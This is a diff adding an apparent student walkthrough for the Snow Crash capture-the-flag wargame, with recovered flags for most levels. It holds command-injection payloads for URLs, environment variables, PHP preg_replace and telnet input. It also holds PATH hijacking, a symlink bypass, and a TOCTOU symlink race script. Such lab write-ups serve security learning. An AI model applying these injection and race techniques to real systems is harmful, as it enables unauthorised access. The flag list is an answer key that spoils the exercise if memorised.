@@ -1,0 +1,94 @@
+Snow crash
+Level02: Numero 43 c est ecrit Password
+Follow tcp => ft_wandr...NDRe.L0L
+We can see in hexdump that 7f correspond a delete donc ft_waNDReLOL
+kooda2puivaav1idi4f57q8iq
+Level03:
+system(« /usr/sbin/env echo Exploit me »)
+Change echo with get flag using cd getflag tmp/echo/
+And change the PATH=/tmp/ 
+qi0maab88jeaj46qoumi7maus
+Level04:
+Using script perl to inject command to the url
+http://192.168.2.92:4747/level04.pl?x=`/bin/getflag`
+ne2searoevaevoem4ov4ar8ap
+Level06:
+2 files level06 and level06.php
+Execute level06 is the binary to level06.php
+Level06.php take 2 arguments one in a file
+We see that /e flag in preg_replac his deprecated because of the possibility to inject code php
+Go inject it so. We put [x ${$z(getflag)}] because //2 will be ${$z(get flag)} (regex).
+Then we need to put the function system in z.
+For that we put this command: ./level06 /tmp/file "system" 
+Then  [x ${$z(getflag)}]  will be ${$system(getflag)} and the output is:
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+Wa have the flag!
+wiok45aaoguiboiki2tuin6ub
+Level07:
+We see a binary file we use DogBolt we see this line:
+ asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
+We see we can put injection code in %s using getenv("LOGNAME")
+We just need to change the LOGNAME env with export LOGNAME=" ; getflag;  "
+When we put ./level07 it will be  asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
+So %s =  ; getflag;
+We execute and we have Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+Level08:
+We can see a binary level08 and a file token without any access.
+We go decompile level08 and we see a line like this: if ( strstr(argv[1], "token") )
+  {
+    printf("You may not access '%s'\n", argv[1]);
+    exit(1);
+  }
+So ./level08 will print you may not access token
+For bypass this we need to do a symbolic link like:
+ln -s /home/user/level08/token /tmp/fi
+And now we can do:
+./level08 /tmp/fi
+/tmp/fi will be the link to token so the name it’s not token
+Output= quif5eloekouj29ke0vouxean
+Su flag08: quif5eloekouj29ke0vouxean
+Getflag: 25749xKZ8L7DkSCwJkT9dyv6f
+Level09:
+I see that ./level09 « file » do a output like
+For each characters for the name of file do{
+puts(Caracter + i position);
+}
+So what I did is a script taking the hex of the content of token (hexdump) change the hex at the good position: like 3466 6d6b => 6634 6b6d
+And do this code:
+hex_str = "66 34 6b 6d 6d 36 70 7c 3d 82 7f 70 82 6e 83 82 44 42 83 44 75 7b 7f 8c 89"
+numbers_list = [int(num, 16) for num in hex_str.split()]
+print(numbers_list)
+new_str = ""
+i = 0
+for n in numbers_list:
+    new_str = new_str + " " + str(n - i)
+    i = i+1
+print(new_str)
+I have 102 51 105 106 105 49 106 117 53 121 117 101 118 97 117 115 52 49 113 49 97 102 105 117 113 this equivalent in ascii text is f3iji1ju5yuevaus41q1afiuq
+Su flag09: f3iji1ju5yuevaus41q1afiuq
+Getflag: s5cAJpM8ev6XHw998pRWG728z
+
+Level10:
+We have 2 files: level10 and token
+We do decompiler in level10 we can see that check if the ip with the port 6969 exist So what I do it’s opening my ip in port 6969 with  command nc -lk 6969
+Next step we see that the code check if the user has access and after opening so the trick it’s to : link /tmp/file => /tmp/file2 (we have the right to file so we bypass access) and after link /tmp/file => /home/user/level10/token
+So I run 2 scripts at the same time for that one moment the window between access and open will be enough to have the changes. (Time of check to time of use (TOCTTOU) vulnerabilities)
+The script is: while  [ 1 ]; do ./level10 /tmp/file 10.0.0.45; done for running ./level10
+And : while  [ 1 ]; do sh /tmp/c; done with /tmp/c => rm /tmp/file && ln -s /home/user/level10/token /tmp/file && rm /tmp/file && ln -s /tmp/file2 /tmp/file 
+We create /tmp/file and /tmp/file2 and we run the script at the same time
+I can receipt the content of token with my port listening: Su flag10: woupa2yuojeeaaed06riuj63c
+GetFlag=feulo4b72j7edeahuete3no7c
+Level11:
+Fichier .lua 
+f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 => hardcoded passed => NotSoEasy 
+We see a echo line command so we telnet 127.0.0.1 and we use « f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 && getflag > /tmp/file « 
+fa6v5ateaw21peobuub8ipe6s
+Getflag: fa6v5ateaw21peobuub8ipe6s
+Level14:
+We see in the file getflag using strings getflag all the flag before ft_des 
+So we just take the last one and input to ft_des
+7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
+Su flag14: 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
+And we have this message: Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
